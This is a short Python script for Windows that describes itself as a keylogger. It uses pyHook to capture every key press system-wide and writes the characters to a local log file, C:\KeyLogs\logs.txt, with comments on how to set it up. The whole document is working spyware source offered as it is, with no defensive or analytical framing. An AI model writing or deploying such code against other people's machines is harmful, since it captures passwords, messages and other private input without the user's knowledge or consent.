#This Keylogger is for Windows OS only.
#Have To install pyHook and pywin32.
import pyHook
import pythoncom
import sys
import logging

#All The Logs Will be Saved in this file(You Have To Create it if not Present)
file_log = "C:\\KeyLogs\\logs.txt"

#This Function Will Be Run whenever a KeyStrok is encountered
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

#Setting Up The PyHook Manager
hooks_manager = pyHook.HookManager()
#Binding the PyHook Manager with the KeyDown event.
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
